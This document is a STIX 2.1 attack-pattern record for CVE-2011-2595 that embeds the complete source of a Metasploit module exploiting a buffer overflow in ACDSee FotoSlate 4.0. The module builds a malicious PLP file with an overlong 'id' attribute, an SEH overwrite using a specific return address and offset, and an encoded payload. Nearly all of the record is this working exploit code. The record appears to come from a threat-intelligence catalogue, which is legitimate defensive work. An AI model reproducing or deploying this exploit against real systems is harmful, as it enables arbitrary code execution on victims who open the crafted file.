{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c0da8fa3-6466-43eb-9e17-513b1f68da4d",
    "created": "2024-08-14T16:37:28.948391Z",
    "modified": "2024-08-14T16:37:28.948396Z",
    "name": "ACDSee FotoSlate PLP File id Parameter Overflow",
    "description": " This module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via a specially crafted id parameter in a String element.  When viewing a malicious PLP file with the ACDSee FotoSlate product, a remote attacker could overflow a buffer and execute arbitrary code. This exploit has been tested on systems such as Windows XP SP3, Windows Vista, and Windows 7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/acdsee_fotoslate_string.rb",
            "external_id": "acdsee_fotoslate_string.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2595"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via\n        a specially crafted id parameter in a String element.  When viewing a malicious\n        PLP file with the ACDSee FotoSlate product, a remote attacker could overflow a\n        buffer and execute arbitrary code. This exploit has been tested on systems such as\n        Windows XP SP3, Windows Vista, and Windows 7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Parvez Anwar', # Vulnerability discovery\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-2595' ],\n          [ 'OSVDB', '75425' ],\n          [ 'BID', '49558' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          #'Space'    => 4000,\n          'BadChars' => \"\\x00\\x22\"\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'ACDSee FotoSlate 4.0 Build 146',\n            {\n              'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll\n              'Offset'      => 1812,\n              'TotalLength' => 5000\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-09-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),\n      ])\n  end\n\n  def exploit\n\n    overflow = rand_text(target[\"Offset\"])\n    overflow << generate_seh_record(target.ret)\n    overflow << payload.encoded\n    overflow << rand_text_alpha(target[\"TotalLength\"] - overflow.length)\n\n    plp =<<TEMPLATE\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<ACDFotoSlateDocument15>\n<PageDefinition>\n<Template>\n<Version>3.0</Version>\n<Page>\n<Name>Letter</Name>\n<Properties>\n<String id=\"#{overflow}\"></String>\n<String id=\"Width\">8.500000IN</String>\n<String id=\"Height\">11.000000IN</String>\n<String id=\"Orientation\">Portrait</String>\n<Bool id=\"AutoRotate\">FALSE</Bool>\n<Bool id=\"AutoFill\">FALSE</Bool>\n</Properties>\n<Content>\n<Bool id=\"UseBGColor\">FALSE</Bool>\n<Int id=\"BGImageType\">0</Int>\n<String id=\"BGImageFile\"></String>\n<Int id=\"BGColor\">16777215</Int>\n</Content>\n</Page>\n<ToolList>\n<Group>\n<Tool>\n<Name>Image</Name>\n<Properties>\n<String id=\"XPos\">0.500000IN</String>\n<String id=\"YPos\">0.500000IN</String>\n<String id=\"Width\">7.500000IN</String>\n<String id=\"Height\">10.000000IN</String>\n<Float id=\"Tilt\">0.000000</Float>\n</Properties>\n<Content>\n<Int id=\"ShapeType\">0</Int>\n<Float id=\"RoundRectX\">0.000000</Float>\n<Float id=\"RoundRectY\">0.000000</Float>\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\n<Bool id=\"AutoRotate\">FALSE</Bool>\n<Float id=\"BorderWidth\">0.000000</Float>\n<Bool id=\"UseBGColor\">FALSE</Bool>\n<Int id=\"BGColor\">8454143</Int>\n<Bool id=\"DropShadow\">FALSE</Bool>\n<Int id=\"DSColor\">0</Int>\n<Bool id=\"BevelEdge\">FALSE</Bool>\n<Bool id=\"Border\">FALSE</Bool>\n<Int id=\"BorderColor\">16711680</Int>\n<Bool id=\"IsLocked\">FALSE</Bool>\n</Content>\n</Tool>\n</Group>\n</ToolList>\n</Template>\n<PageContent>\n<Version>3.0</Version>\n<Page>\n<Name>Letter</Name>\n<Content>\n<Bool id=\"UseBGColor\">FALSE</Bool>\n<Int id=\"BGImageType\">0</Int>\n<String id=\"BGImageFile\"></String>\n<Int id=\"BGColor\">16777215</Int>\n</Content>\n</Page>\n<ToolList>\n<Group>\n<Tool>\n<Name>Image</Name>\n<Content>\n<Int id=\"ShapeType\">0</Int>\n<Float id=\"RoundRectX\">0.000000</Float>\n<Float id=\"RoundRectY\">0.000000</Float>\n<Bool id=\"ShrinkToFit\">FALSE</Bool>\n<Bool id=\"AutoRotate\">FALSE</Bool>\n<Float id=\"BorderWidth\">0.000000</Float>\n<Bool id=\"UseBGColor\">FALSE</Bool>\n<Int id=\"BGColor\">8454143</Int>\n<Bool id=\"DropShadow\">FALSE</Bool>\n<Int id=\"DSColor\">0</Int>\n<Bool id=\"BevelEdge\">FALSE</Bool>\n<Bool id=\"Border\">FALSE</Bool>\n<Int id=\"BorderColor\">16711680</Int>\n<Bool id=\"IsLocked\">FALSE</Bool>\n</Content>\n</Tool>\n</Group>\n</ToolList>\n</PageContent>\n</PageDefinition>\n</ACDFotoSlateDocument15>\nTEMPLATE\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(plp)\n  end\nend\n\n\n=begin\nAfter SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid\nusing a long buffer in order to avoid the meterpreter possibly being broken.\n=end\n",
    "x_mitre_disclosure_date": "2011-09-12",
    "x_mitre_platforms": [
        "win'"
    ]
}